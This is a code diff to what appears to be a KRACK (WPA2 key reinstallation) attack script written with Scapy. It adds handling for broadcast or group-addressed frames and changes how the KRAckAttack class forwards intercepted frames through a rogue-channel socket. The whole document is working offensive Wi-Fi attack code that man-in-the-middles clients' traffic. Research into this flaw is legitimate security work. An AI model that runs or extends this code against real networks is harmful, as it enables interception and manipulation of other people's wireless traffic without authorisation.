@@ -169,6 +169,10 @@ def dot11_get_iv(p):
 	else:
 		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
 
+def dot11_is_group(p):
+	# TODO: Detect if multicast bit is set in p.addr1
+	return p.addr1 == "ff:ff:ff:ff:ff:ff"
+
 def get_eapol_msgnum(p):
 	FLAG_PAIRWISE = 0b0000001000
 	FLAG_ACK      = 0b0010000000
@@ -640,6 +644,7 @@ class KRAckAttack():
 
 			# Decide whether we will (eventually) forward it
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
+			might_forward = might_forward or (args.group and dot11_is_group(p) and Dot11WEP in p)
 
 			# Pay special attention to Deauth and Disassoc frames
 			if Dot11Deauth in p or Dot11Disas in p:
@@ -653,16 +658,22 @@ class KRAckAttack():
 
 			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
-				client = self.clients[p.addr1]
+				# Unicast frames to clients
+				if p.addr1 in self.clients:
+					client = self.clients[p.addr1]
 
-				# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
-				if self.handle_toclient_pairwise(client, p):
-					pass
+					# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
+					if self.handle_toclient_pairwise(client, p):
+						pass
 
-				elif Dot11Deauth in p:
-					del self.clients[p.addr1]
-					self.sock_rogue.send(p)
+					elif Dot11Deauth in p:
+						del self.clients[p.addr1]
+						self.sock_rogue.send(p)
 
+					else:
+						self.sock_rogue.send(p)
+
+				# Group addressed frames
 				else:
 					self.sock_rogue.send(p)
 
